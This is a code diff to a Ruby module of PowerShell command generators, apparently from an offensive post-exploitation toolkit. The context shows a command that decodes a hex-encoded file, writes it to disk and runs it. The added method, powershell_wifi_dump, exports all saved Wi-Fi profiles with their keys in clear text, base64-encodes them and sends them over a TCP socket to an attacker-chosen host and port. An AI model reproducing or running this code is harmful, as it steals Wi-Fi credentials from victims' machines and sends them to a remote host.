@@ -30,4 +30,8 @@ module PowershellCommands
     powershell_command = %($hex_string=[io.file]::ReadAllBytes("#{read_path}");$byte_array=$hex_string -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}};[System.IO.WriteAllBytes(#{write_path},$byte_array);Start-Process #{write_path})
     return powershell_command
   end
+  def powershell_wifi_dump(host,port,directory = 'wifi_dir')
+    powershell_command = "$savedir='c:\\windows\\temp\\#{directory}\\';mkdir $savedir;netsh wlan export profile folder=$savedir key=clear;$files=dir $savedir;foreach($file in $files){$xml=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($file.FullName);$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine($file);$writer.flush();$writer.WriteLine($xml);$writer.flush();$socket.close()}"
+    return powershell_command
+  end
 end
